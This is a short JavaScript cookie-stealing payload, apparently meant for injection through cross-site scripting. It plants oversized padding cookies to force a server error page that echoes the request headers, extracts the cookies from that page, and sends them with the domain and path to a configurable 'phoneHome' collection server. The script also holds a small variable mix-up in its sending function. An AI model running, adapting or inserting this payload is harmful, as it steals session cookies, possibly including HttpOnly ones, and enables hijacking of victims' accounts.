/** CHANGE THIS VALUE TO YOUR SERVER **/
var phoneHome = "http://m19.us/"; // leave trailing slash

var today = new Date();
var expire = new Date();
expire.setTime(today.getTime() + 2000);
complete = false;
padding="";
for (j=0;j<=1000;++j) { padding+="A"; }
for (i=0;i < 10; ++i) { document.cookie="z"+i+"="+padding+"; expires="+expire.toGMTString()+"; path=/;"; }

function sendCookie(c)
{
  var xhr2 = new XMLHttpRequest();
  xhr.open("GET", phoneHome+"x.php?c="+c+"&d="+document.domain+document.location.pathname,true);
  xhr.send();
}

function grabCookie() {
  if(!complete && this.responseText.length > 1) {
    var patt = new RegExp("<pre[^>]*>(.*?)</pre>");
    c = patt.exec(this.responseText.replace(/(Cookie:|AAAAAAAAAA|\r\n|\n|\r|\/n|\/r)/gm,""));
    sendCookie(c[1]);
    complete = true;
  }
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = grabCookie;
xhr.open("GET", document.domain+document.location.pathname);
xhr.send();
